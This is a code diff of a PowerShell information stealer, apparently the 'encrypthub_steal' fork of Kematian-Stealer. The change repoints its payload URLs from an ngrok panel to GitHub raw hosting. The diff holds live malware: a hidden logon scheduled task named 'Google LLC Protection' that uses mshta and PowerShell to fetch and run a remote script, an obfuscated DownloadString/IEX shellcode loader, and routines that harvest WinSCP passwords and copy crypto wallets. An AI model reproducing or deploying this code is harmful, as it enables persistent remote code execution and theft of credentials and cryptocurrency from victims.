@@ -249,10 +249,10 @@ function Invoke-TASKS {
         $KDOT_DIR.Attributes = "Hidden", "System"
         $task_name = "Google LLC Protection"
         $task_action = if ($debug) {
-            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://panel.ngrok.app/main/winrar/steal/encrypthub_steal.ps1'|iex`""
+            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/encrypthub/steal/main/steal/encrypthub_steal.ps1'|iex`""
         }
         else {
-            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://panel.ngrok.app/main/winrar/steal/encrypthub_steal.ps1'|iex`",0)(window.close)"
+            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';`$debug=`$$debug;`$vm_protect=`$$vm_protect;`$encryption_key ='$encryption_key';`$blockhostsfile=`$$blockhostsfile;`$criticalprocess=`$$criticalprocess;`$melt=`$$melt;`$fakeerror=`$$fakeerror;`$persistence=`$$persistence;`$write_disk_only=`$False;`$t = Iwr -Uri 'https://raw.githubusercontent.com/encrypthub/steal/main/steal/encrypthub_steal.ps1'|iex`",0)(window.close)"
         }
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
@@ -949,7 +949,7 @@ function Backup-Data {
             $output += "Password : $password`n`n"
         }
         $output | Out-File -FilePath $outputPath
-		$global:winscpCounter = $true
+	$global:winscpCounter = $true
         Write-Host "[!] WinSCP Session information saved" -ForegroundColor Green
     }
     Get-WinSCPSessions
@@ -1104,9 +1104,9 @@ function Backup-Data {
                     if (Test-Path $extentionPath) {
                         if (Get-ChildItem $extentionPath -ErrorAction SilentlyContinue) {
                             try {
-								#!! WALLET COPY
-								$global:moneyCounter += 1
-								#--------------
+				#!! WALLET COPY
+				$global:moneyCounter += 1
+				#--------------
                                 $wallet_browser = "$walletName ($browserName)"
                                 $walletDirPath = Join-Path $folder_crypto $wallet_browser
                                 New-Item -ItemType Directory -Path $walletDirPath -Force | out-null
@@ -1164,7 +1164,7 @@ function Backup-Data {
     Set-Location "$env:LOCALAPPDATA\Temp"
 	
     #Shellcode loader
-    $kematian_shellcode = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
+    $kematian_shellcode = ("https://raw.githubusercontent.com/encrypthub/steal/main/shellcode.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$kematian_shellcode')"
     $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
     $proc.WaitForExit()
